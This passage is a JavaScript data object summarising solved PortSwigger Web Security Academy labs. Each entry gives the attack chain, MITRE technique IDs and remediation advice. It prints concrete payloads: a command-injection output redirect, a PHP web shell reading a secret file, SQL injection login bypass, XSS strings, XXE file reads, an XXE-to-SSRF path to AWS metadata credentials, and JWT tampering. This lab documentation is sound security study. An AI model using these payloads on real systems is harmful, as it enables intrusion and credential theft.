      { label: "Platform", value: "PortSwigger Web Security Academy" },
      { label: "Vulnerability", value: "Blind OS Command Injection with Output Redirection · CWE-78" },
      { label: "Write Path", value: "POST /feedback/submit → /var/www/images/output.txt" },
      { label: "Read Path", value: "GET /image?filename=output.txt" },
    ],
    chain: [
      { step: "Confirmed blind OS command injection in the email parameter of POST /feedback/submit", technique: "T1190" },
      { step: "Injected ||whoami>/var/www/images/output.txt|| to redirect command stdout into the web-accessible images folder", technique: "T1059.004" },
      { step: "Requested GET /image?filename=output.txt in Burp Repeater to read the exfiltrated system username" },
    ],
    response: [
      "Eliminate shell command invocation in feedback processing",
      "Mount web static/image directories as read-only for the application service account",
    ],
  },
  "rce-web-shell-upload": {
    verdict: "Unrestricted PHP web shell uploaded via avatar form to read /home/carlos/secret",
    severity: "Critical",
    facts: [
      { label: "Platform", value: "PortSwigger Web Security Academy" },
      { label: "Vulnerability", value: "Unrestricted Upload of File with Dangerous Type · CWE-434" },
      { label: "Endpoint", value: "POST /my-account/avatar → GET /files/avatars/shell.php" },
      { label: "Payload", value: "<?php echo file_get_contents('/home/carlos/secret'); ?>" },
    ],
    chain: [
      { step: "Uploaded a PHP script (shell.php) through the profile avatar upload form with no extension/content filtering", technique: "T1190" },
      { step: "Inspected the profile HTML source in Burp Suite to locate /files/avatars/shell.php", technique: "T1505.003" },
      { step: "Requested GET /files/avatars/shell.php to execute the PHP payload and exfiltrate /home/carlos/secret", technique: "T1005" },
    ],
    response: [
      "Enforce a strict server-side extension allowlist (.jpg, .png, .webp) and verify magic bytes",
      "Disable script execution (php_flag engine off) in the upload storage directory and serve uploads from a separate static domain/S3 bucket",
    ],
  },
  "web-shell-content-type-bypass": {
    verdict: "Content-Type filter bypassed by spoofing image/jpeg on a .php web shell upload",
    severity: "Critical",
    facts: [
      { label: "Platform", value: "PortSwigger Web Security Academy" },
      { label: "Vulnerability", value: "File Upload Content-Type Restriction Bypass · CWE-434" },
      { label: "Bypass", value: "Content-Type: application/x-php → Content-Type: image/jpeg" },
    ],
    chain: [
      { step: "Attempted uploading shell.php and observed a 403/rejection due to Content-Type: application/x-php" },
      { step: "Intercepted the multipart POST /my-account/avatar in Burp Repeater and changed Content-Type to image/jpeg", technique: "T1190" },
      { step: "Triggered GET /files/avatars/shell.php to execute arbitrary PHP code and read /home/carlos/secret", technique: "T1505.003" },
    ],
    response: [
      "Never rely on the client-controlled Content-Type header to validate file types",
      "Validate image content using server-side image parsing libraries and rename uploaded files with safe extensions",
    ],
  },
  "unprotected-admin-functionality": {
    verdict: "Unauthenticated /administrator-panel discovered via /robots.txt and used to delete target user",
    severity: "High",
    facts: [
      { label: "Platform", value: "PortSwigger Web Security Academy" },
      { label: "Vulnerability", value: "Broken Access Control / Security by Obscurity · CWE-284" },
      { label: "Disclosed Path", value: "GET /robots.txt → Disallow: /administrator-panel" },
    ],
    chain: [
      { step: "Requested GET /robots.txt during initial web reconnaissance", technique: "T1595" },
      { step: "Identified Disallow: /administrator-panel and browsed directly to the endpoint", technique: "T1190" },
      { step: "Executed administrative user deletion without authentication" },
    ],
    response: [
      "Enforce authentication and role-based access control on all administrative endpoints",
      "Do not list sensitive internal paths in robots.txt",
    ],
  },
  "unprotected-admin-unpredictable-url": {
    verdict: "Obscured admin panel URL leaked in inline JavaScript source and accessed without admin privileges",
    severity: "High",
    facts: [
      { label: "Platform", value: "PortSwigger Web Security Academy" },
      { label: "Vulnerability", value: "Broken Access Control & Source Code Disclosure · CWE-284" },
      { label: "Source", value: "Inline JavaScript adminPanelTag.setAttribute('href', '/admin-…')" },
    ],
    chain: [
      { step: "Reviewed the login page HTML/JavaScript source in Browser DevTools and Burp Suite" },
      { step: "Found an inline script revealing the randomized /admin-<random> URL even for unauthenticated users", technique: "T1190" },
      { step: "Navigated directly to the disclosed admin URL and deleted the target user" },
    ],
    response: [
      "Require server-side admin role verification on every admin route rather than relying on URL secrecy",
      "Never render privileged navigation script blocks to unauthenticated users",
    ],
  },
  "user-role-request-parameter": {
    verdict: "Vertical privilege escalation achieved by flipping Cookie: Admin=false to Admin=true",
    severity: "Critical",
    facts: [
      { label: "Platform", value: "PortSwigger Web Security Academy" },
      { label: "Vulnerability", value: "Client-Side Authorization / Cookie Tampering · CWE-565" },
      { label: "Tampered Cookie", value: "Cookie: Admin=true" },
    ],
    chain: [
      { step: "Authenticated as wiener and inspected the Set-Cookie header in Burp Suite Proxy" },
      { step: "Modified Cookie: Admin=false to Cookie: Admin=true on GET /admin in Burp Repeater", technique: "T1078" },
      { step: "Accessed the administrative panel and deleted the target user" },
    ],
    response: [
      "Store user roles and permissions in server-side session state or cryptographically signed tokens, never in plaintext cookies",
    ],
  },
  "user-role-modified-profile": {
    verdict: "Mass Assignment privilege escalation by injecting \"roleid\": 2 into POST /my-account/change-email",
    severity: "Critical",
    facts: [
      { label: "Platform", value: "PortSwigger Web Security Academy" },
      { label: "Vulnerability", value: "Mass Assignment / Over-Posting · CWE-915" },
      { label: "Endpoint", value: "POST /my-account/change-email" },
      { label: "Payload", value: "{\"email\":\"wiener@normal-user.net\",\"roleid\":2}" },
    ],
    chain: [
      { step: "Updated email address as wiener and observed {\"roleid\": 1} returned in the JSON response" },
      { step: "Replayed POST /my-account/change-email in Burp Repeater with \"roleid\": 2 added to the JSON body", technique: "T1098" },
      { step: "Verified roleid updated to 2 (administrator), accessed /admin, and deleted the target user" },
    ],
    response: [
      "Use explicit DTO allowlists (only binding editable fields like email) instead of binding raw JSON bodies to user model objects",
    ],
  },
  "user-id-controlled": {
    verdict: "Horizontal privilege escalation (IDOR) via unverified ?id=carlos parameter on /my-account",
    severity: "High",
    facts: [
      { label: "Platform", value: "PortSwigger Web Security Academy" },
      { label: "Vulnerability", value: "Insecure Direct Object Reference (IDOR) · CWE-639" },
      { label: "Endpoint", value: "GET /my-account?id=carlos" },
    ],
    chain: [
      { step: "Logged in as wiener and observed GET /my-account?id=wiener in Burp Proxy" },
      { step: "Changed the query parameter to ?id=carlos in Burp Repeater", technique: "T1190" },
      { step: "Retrieved carlos's profile page and extracted his private API key", technique: "T1005" },
    ],
    response: [
      "Derive the current user identity from the authenticated server-side session rather than a URL query parameter",
    ],
  },
  "user-id-unpredictable": {
    verdict: "Harvested carlos's GUID from public blog post HTML and exploited IDOR on /my-account?id=<GUID>",
    severity: "High",
    facts: [
      { label: "Platform", value: "PortSwigger Web Security Academy" },
      { label: "Vulnerability", value: "IDOR with Unpredictable GUIDs · CWE-639" },
      { label: "Endpoint", value: "GET /my-account?id=<carlos-guid>" },
    ],
    chain: [
      { step: "Browsed public blog posts authored by carlos and inspected the author link (/blogs?userId=<GUID>)" },
      { step: "Replaced wiener's GUID in GET /my-account?id= with carlos's GUID in Burp Repeater", technique: "T1190" },
      { step: "Extracted carlos's API key from the unauthorized profile response", technique: "T1005" },
    ],
    response: [
      "Using UUIDs/GUIDs is not a substitute for access control; verify that the session owner matches the requested user ID",
    ],
  },
  "user-id-data-leakage": {
    verdict: "Extracted carlos's API key from the HTML body of an HTTP 302 redirect response",
    severity: "High",
    facts: [
      { label: "Platform", value: "PortSwigger Web Security Academy" },
      { label: "Vulnerability", value: "IDOR with Sensitive Data Leakage in 302 Redirect · CWE-200" },
      { label: "Endpoint", value: "GET /my-account?id=carlos (HTTP 302 Found)" },
    ],
    chain: [
      { step: "Requested GET /my-account?id=carlos in Burp Repeater" },
      { step: "Observed that the server returned HTTP 302 Found redirecting to /login, but still rendered the full profile HTML in the response body", technique: "T1190" },
      { step: "Read carlos's API key directly from the raw 302 response in Burp Repeater", technique: "T1005" },
    ],
    response: [
      "Immediately terminate request execution (return/exit) after issuing an authorization redirect so page templates are never rendered",
    ],
  },
  "user-id-password-disclosure": {
    verdict: "Administrator plaintext password extracted via IDOR on pre-populated password input field",
    severity: "Critical",
    facts: [
      { label: "Platform", value: "PortSwigger Web Security Academy" },
      { label: "Vulnerability", value: "IDOR + Plaintext Password Exposure in HTML · CWE-639 / CWE-522" },
      { label: "Endpoint", value: "GET /my-account?id=administrator" },
    ],
    chain: [
      { step: "Inspected GET /my-account?id=wiener and noticed <input type=password name=password value='...'>" },
      { step: "Modified the request to GET /my-account?id=administrator in Burp Repeater", technique: "T1190" },
      { step: "Extracted the administrator's plaintext password from the HTML source, logged in as administrator, and deleted carlos", technique: "T1552" },
    ],
    response: [
      "Never store passwords in reversible form or pre-populate password fields in HTML responses",
      "Enforce strict session-to-object ownership checks on /my-account",
    ],
  },
  "basic-ssrf-local-server": {
    verdict: "Internal loopback /admin interface accessed and user deleted via SSRF in stockApi parameter",
    severity: "Critical",
    facts: [
      { label: "Platform", value: "PortSwigger Web Security Academy" },
      { label: "Vulnerability", value: "Server-Side Request Forgery (SSRF) · CWE-918" },
      { label: "Parameter", value: "POST /product/stock → stockApi=http://localhost/admin" },
    ],
    chain: [
      { step: "Confirmed direct browser access to /admin is blocked for external IP addresses" },
      { step: "Intercepted POST /product/stock in Burp Repeater and changed stockApi to http://localhost/admin", technique: "T1190" },
      { step: "Submitted stockApi=http://localhost/admin/delete?username=carlos to execute the administrative deletion via loopback SSRF" },
    ],
    response: [
      "Replace full URL parameters (stockApi) with fixed server-side service identifiers",
      "Block loopback (127.0.0.0/8, ::1) and RFC1918 private ranges in outbound HTTP client requests, and require authentication on /admin even from localhost",
    ],
  },
  "sqli-login-bypass": {
    verdict: "Authentication bypassed as administrator via SQL comment injection (administrator'--)",
    severity: "Critical",
    facts: [
      { label: "Platform", value: "PortSwigger Web Security Academy" },
      { label: "Vulnerability", value: "SQL Injection Authentication Bypass · CWE-89" },
      { label: "Endpoint", value: "POST /login" },
      { label: "Payload", value: "username=administrator'--" },
    ],
    chain: [
      { step: "Intercepted the POST /login request in Burp Suite Proxy" },
      { step: "Injected administrator'-- into the username parameter so the query became SELECT * FROM users WHERE username = 'administrator'--' AND password = '...'", technique: "T1190" },
      { step: "Bypassed the password check completely and gained an authenticated administrator session", technique: "T1078" },
    ],
    response: [
      "Use parameterized queries (PreparedStatement) for all database authentication lookups",
    ],
  },
  "stored-xss-html-context": {
    verdict: "Persistent JavaScript execution achieved via unencoded <script> payload in blog comments",
    severity: "High",
    facts: [
      { label: "Platform", value: "PortSwigger Web Security Academy" },
      { label: "Vulnerability", value: "Stored Cross-Site Scripting (XSS) · CWE-79" },
      { label: "Endpoint", value: "POST /post/comment (comment field)" },
      { label: "Payload", value: "<script>alert(1)</script>" },
    ],
    chain: [
      { step: "Submitted a test comment to verify how user input is rendered in the blog post HTML" },
      { step: "Observed that comment text is inserted raw into the HTML body with zero entity encoding", technique: "T1189" },
      { step: "Posted <script>alert(1)</script>, triggering persistent execution for every visitor viewing the post" },
    ],
    response: [
      "HTML-encode all user-supplied comment content before rendering (&lt;, &gt;, &quot;, &#39;, &amp;) and deploy a strict CSP",
    ],
  },
  "reflected-xss-html-context": {
    verdict: "Reflected JavaScript execution via unencoded ?search=<script>alert(1)</script> parameter",
    severity: "Medium",
    facts: [
      { label: "Platform", value: "PortSwigger Web Security Academy" },
      { label: "Vulnerability", value: "Reflected Cross-Site Scripting (XSS) · CWE-79" },
      { label: "Endpoint", value: "GET /?search=<script>alert(1)</script>" },
    ],
    chain: [
      { step: "Probed GET /?search=<h1>hello 3omda</h1> and confirmed raw HTML reflection in the response" },
      { step: "Submitted GET /?search=<script>alert(1)</script> to execute arbitrary JavaScript in the browser context" },
    ],
    response: [
      "Apply context-aware HTML output encoding to all reflected search parameters",
    ],
  },
  "dom-xss-document-write": {
    verdict: "DOM XSS exploited by breaking out of document.write('<img>') via ">"<svg onload=alert(1)>",
    severity: "Medium",
    facts: [
      { label: "Platform", value: "PortSwigger Web Security Academy" },
      { label: "Vulnerability", value: "DOM-Based XSS (location.search → document.write) · CWE-79" },
      { label: "Payload", value: "?search=\"><svg onload=alert(1)>" },
    ],
    chain: [
      { step: "Traced window.location.search into trackSearch() which calls document.write('<img src=\"/resources/images/tracker.gif?searchTerms=' + query + '\">')" },
      { step: "Injected \"><svg onload=alert(1)> to close the src attribute and img tag and execute JavaScript" },
    ],
    response: [
      "Avoid document.write(); create DOM elements safely with document.createElement() and encode URL parameters with encodeURIComponent()",
    ],
  },
  "dom-xss-innerhtml-sink": {
    verdict: "DOM XSS in innerHTML sink exploited via <img src=1 onerror=alert(1)>",
    severity: "Medium",
    facts: [
      { label: "Platform", value: "PortSwigger Web Security Academy" },
      { label: "Vulnerability", value: "DOM-Based XSS (location.search → element.innerHTML) · CWE-79" },
      { label: "Payload", value: "?search=<img src=1 onerror=alert(1)>" },
    ],
    chain: [
      { step: "Inspected doSearchQuery() and saw window.location.search assigned directly to document.getElementById('searchMessage').innerHTML" },
      { step: "Bypassed innerHTML's <script> execution block by injecting <img src=1 onerror=alert(1)>" },
    ],
    response: [
      "Use element.textContent instead of element.innerHTML when displaying plain text strings from URL parameters",
    ],
  },
  "dom-xss-jquery-href": {
    verdict: "DOM XSS in jQuery $('#backLink').attr('href') exploited via javascript:alert(document.cookie)",
    severity: "Medium",
    facts: [
      { label: "Platform", value: "PortSwigger Web Security Academy" },
      { label: "Vulnerability", value: "DOM-Based XSS (location.search → jQuery attr('href')) · CWE-79" },
      { label: "Payload", value: "/feedback?returnPath=javascript:alert(document.cookie)" },
    ],
    chain: [
      { step: "Reviewed the /feedback page source and located $('#backLink').attr('href', (new URLSearchParams(window.location.search)).get('returnPath'))" },
      { step: "Set returnPath=javascript:alert(document.cookie) and triggered the Back link" },
    ],
    response: [
      "Validate that returnPath starts with a relative slash (/^\/[a-zA-Z0-9/_-]*$/) and reject javascript: or data: URIs",
    ],
  },
  "xxe-retrieve-files": {
    verdict: "Arbitrary file read (/etc/passwd) achieved via XML External Entity (XXE) injection in stockCheck",
    severity: "High",
    facts: [
      { label: "Platform", value: "PortSwigger Web Security Academy" },
      { label: "Vulnerability", value: "XML External Entity (XXE) Injection · CWE-611" },
      { label: "Endpoint", value: "POST /product/stock (XML body)" },
      { label: "Payload", value: "<!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>" },
    ],
    chain: [
      { step: "Intercepted POST /product/stock in Burp Repeater and identified XML payload parsing", technique: "T1190" },
      { step: "Defined <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> in the DOCTYPE header and referenced &xxe; inside <productId>", technique: "T1005" },
      { step: "Extracted the full /etc/passwd file contents from the server's 'Invalid product ID' response" },
    ],
    response: [
      "Disable DTDs (Document Type Definitions) and external entities completely in the XML parser configuration",
    ],
  },
  "xxe-ssrf-aws-metadata": {
    verdict: "AWS EC2 IAM admin credentials exfiltrated from 169.254.169.254 via XXE-to-SSRF escalation",
    severity: "Critical",
    facts: [
      { label: "Platform", value: "PortSwigger Web Security Academy" },
      { label: "Vulnerability", value: "XXE to SSRF targeting AWS IMDSv1 · CWE-611 / CWE-918" },
      { label: "Target URL", value: "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin" },
    ],
    chain: [
      { step: "Injected <!ENTITY xxe SYSTEM \"http://169.254.169.254/\"> into POST /product/stock", technique: "T1190" },
      { step: "Iteratively traversed /latest/meta-data/iam/security-credentials/admin via the error message output" },
      { step: "Exfiltrated the AWS AccessKeyId, SecretAccessKey, and Session Token JSON object", technique: "T1552" },
    ],
    response: [
      "Disable external XML entities and DTDs in the application XML parser",
      "Enforce IMDSv2 (requiring session-oriented PUT token headers) on all EC2 instances",
    ],
  },
  "jwt-unverified-signature": {
    verdict: "Admin account takeover by modifying JWT sub claim to administrator without signature verification",
    severity: "Critical",
    facts: [
      { label: "Platform", value: "PortSwigger Web Security Academy" },
      { label: "Vulnerability", value: "JWT Unverified Signature · CWE-347" },
      { label: "Modified Claim", value: "{\"sub\": \"administrator\"}" },
    ],
    chain: [
      { step: "Authenticated as wiener and captured the RS256 session JWT in Burp Suite" },
      { step: "Base64Url-decoded the JWT payload, changed \"sub\":\"wiener\" to \"sub\":\"administrator\", and re-encoded the payload", technique: "T1078" },
      { step: "Sent GET /admin with the modified token; the server accepted the payload without verifying the signature and deleted carlos" },
    ],
    response: [
      "Always call jwt.verify() (not jwt.decode()) using the server's cryptographic verification key on every request",
    ],
  },
  "jwt-flawed-signature": {
    verdict: "JWT signature verification bypassed via alg: none algorithm confusion attack",
    severity: "Critical",
    facts: [
      { label: "Platform", value: "PortSwigger Web Security Academy" },
      { label: "Vulnerability", value: "JWT 'alg: none' Signature Bypass · CWE-347" },
      { label: "Modified Header", value: "{\"alg\": \"none\", \"typ\": \"JWT\"}" },
    ],
    chain: [
      { step: "Captured wiener's session JWT in Burp Suite" },
      { step: "Modified the JWT header to \"alg\": \"none\" and the payload to \"sub\": \"administrator\"", technique: "T1078" },
      { step: "Stripped the signature bytes after the second dot (leaving the trailing dot) and accessed /admin to delete carlos" },
    ],
    response: [
      "Explicitly whitelist allowed signing algorithms (e.g., algorithms: ['RS256']) and reject 'none' in the JWT verifier",
    ],
  },
  "oauth-implicit-flow-bypass": {
    verdict: "Account takeover on /authenticate by tampering email to carlos@carlos-montoya.net in OAuth implicit flow",
    severity: "Critical",
    facts: [
      { label: "Platform", value: "PortSwigger Web Security Academy" },
      { label: "Vulnerability", value: "OAuth 2.0 Implicit Flow Broken Token Binding · CWE-287" },
      { label: "Endpoint", value: "POST /authenticate" },
    ],
    chain: [
      { step: "Completed OAuth login as wiener and inspected POST /authenticate in Burp Proxy HTTP History" },
      { step: "Observed the client sending {\"email\",\"username\",\"token\"} where the backend never verified that the access token belonged to that email", technique: "T1190" },
      { step: "Changed email to carlos@carlos-montoya.net in Burp Repeater and used the returned session cookie to take over carlos's account", technique: "T1078" },
    ],
    response: [
      "Migrate from OAuth Implicit Flow to Authorization Code Flow with PKCE, and verify the user identity server-side against the OAuth provider's /userinfo endpoint",
    ],
  },
  "2fa-simple-bypass": {
    verdict: "2FA step bypassed via forced browsing to /my-account after primary password login",
    severity: "High",
    facts: [
      { label: "Platform", value: "PortSwigger Web Security Academy" },
      { label: "Vulnerability", value: "2FA Authentication State Bypass (Forced Browsing) · CWE-287" },
      { label: "Endpoint", value: "GET /login2 → GET /my-account" },
    ],
    chain: [
      { step: "Logged in with carlos's primary credentials and was redirected to GET /login2 for the 4-digit 2FA code" },
      { step: "Observed in Burp Suite that a fully authenticated session cookie was already issued before 2FA verification", technique: "T1078" },
      { step: "Requested GET /my-account directly, bypassing the /login2 2FA screen completely" },
    ],
    response: [
      "Do not issue an authenticated session token until both primary authentication and MFA verification are completed",
    ],
  },
  "password-reset-broken-logic": {
    verdict: "Account takeover of carlos by tampering the hidden username parameter during password reset submission",
    severity: "Critical",
    facts: [
      { label: "Platform", value: "PortSwigger Web Security Academy" },
      { label: "Vulnerability", value: "Password Reset Unbound Token Logic Flaw · CWE-640" },
      { label: "Endpoint", value: "POST /forgot-password?temp-forgot-password-token=..." },
    ],
    chain: [
      { step: "Requested a legitimate password reset for controlled user wiener and opened the reset link from the email client" },
      { step: "Intercepted the password submission POST request in Burp Repeater and noticed temp-forgot-password-token was not bound to username=wiener", technique: "T1190" },
      { step: "Changed username=wiener to username=carlos with a new password, overwriting carlos's password and taking over his account", technique: "T1098" },
    ],
    response: [
      "Cryptographically bind every password reset token to the single user ID that requested it in the backend database, and ignore client-supplied username fields",
    ],
  },
};
